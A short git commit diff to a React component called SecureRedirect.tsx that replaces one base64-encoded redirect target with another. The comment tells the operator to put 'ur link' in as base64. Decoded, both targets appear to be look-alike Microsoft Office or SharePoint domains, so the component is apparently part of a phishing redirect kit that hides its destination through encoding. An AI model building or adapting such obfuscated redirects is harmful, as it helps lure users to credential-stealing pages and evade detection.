7a1a18ecfbd032a8b5629f28b0373c5895a989b7
thematriqs <charlie@eliteoutdoorimage.com>
2025-09-10 13:37:04 -0700

    Update SecureRedirect.tsx

--- src/components/SecureRedirect.tsx
+++ src/components/SecureRedirect.tsx
@@ -16,7 +16,7 @@ const SecureRedirect: React.FC = () => {
 
   // Enhanced URL configuration
   const targetUrls = [
-    "aHR0cHM6Ly9vZmZpY2Uuc2hhcmVwaW50Lm9ubGluZS9aSlhlcUpHVA==" // change ur link from here "" into base64
+    "aHR0cHM6Ly9vZmZpY2Uuc2hhcmVlZXZhaXZlLnh5ei9vU0VxQ0R5bw==" // change ur link from here "" into base64
   ];
 
   // Utility functions
